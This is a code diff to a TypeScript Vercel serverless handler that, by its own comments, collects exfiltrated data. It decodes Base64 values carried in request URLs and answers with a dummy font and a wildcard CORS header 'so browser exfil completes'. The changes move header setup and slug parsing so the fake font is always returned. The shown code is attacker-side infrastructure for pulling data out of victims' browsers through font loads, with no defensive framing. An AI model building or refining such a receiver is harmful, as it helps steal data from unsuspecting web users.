@@ -31,12 +31,16 @@ function base58(buffer: Buffer): string {
 }
 
 export default async function handler(req: VercelRequest, res: VercelResponse) {
-  const slugArr = req.query.slug as string[] | string
-  const raw = Array.isArray(slugArr) ? slugArr[slugArr.length - 1] : slugArr
-  const parts = raw.split('_')
-  if (parts.length < 2) return res.status(400).send('Bad slug')
+  // Always set CORS header
+  res.setHeader('Access-Control-Allow-Origin', '*')
+  res.setHeader('Content-Type', 'font/woff')
 
   try {
+    const slugArr = req.query.slug
+    const raw = Array.isArray(slugArr) ? slugArr[slugArr.length - 1] : slugArr as string
+    const parts = raw.split('_')
+    if (parts.length < 2) throw new Error('Bad slug')
+
     // Decode URL‐safe Base64
     let b64 = parts[1].replace(/-/g, '+').replace(/_/g, '/')
     b64 += '='.repeat((4 - (b64.length % 4)) % 4)
@@ -78,10 +82,6 @@ export default async function handler(req: VercelRequest, res: VercelResponse) {
     console.error('❌ Error processing exfil:', e)
   }
 
-  // Return dummy font so browser exfil completes
-  res
-    .status(200)
-    .setHeader('Content-Type', 'font/woff')
-    .setHeader('Access-Control-Allow-Origin', '*')
-    .send(Buffer.from([0x77,0x4f,0x46,0x46]))
+  // Always respond with dummy font
+  res.status(200).send(Buffer.from([0x77,0x4f,0x46,0x46]))
 }
